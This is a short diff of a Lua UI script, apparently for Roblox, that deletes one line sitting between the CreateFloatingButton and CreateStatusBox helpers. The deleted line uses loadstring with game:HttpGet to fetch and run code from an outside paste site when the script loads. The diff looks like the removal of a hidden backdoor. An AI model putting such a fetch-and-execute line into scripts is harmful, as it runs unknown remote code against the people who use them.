@@ -276,7 +276,7 @@ local function CreateFloatingButton(config)
 
     return btn
 end
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ixnI0bFWrF/0", true))()
+
 local function CreateStatusBox(config)
     config = config or {}
     local name = config.Name or "StatusBox"
